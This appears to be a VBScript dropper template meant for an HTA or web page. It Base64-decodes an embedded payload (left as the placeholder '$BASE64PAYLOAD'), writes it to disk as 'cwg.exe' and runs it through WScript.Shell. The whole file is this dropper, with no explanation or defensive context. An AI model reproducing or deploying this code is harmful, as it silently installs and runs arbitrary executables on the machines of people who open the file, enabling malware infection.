﻿<SCRIPT LANGUAGE="VBScript">
Const adSaveCreateOverWrite = 2
Const adTypeBinary          = 1

    Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

    Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

    dim contents

     contents = "$BASE64PAYLOAD";

    Set objFSO=CreateObject("Scripting.FileSystemObject")

    Set objFile = objFSO.CreateTextFile("cwg.exe",True)
    objFile.Write Base64Decode(contents)
objFile.Close

    CreateObject("WScript.Shell").Run "cwg.exe"
</SCRIPT>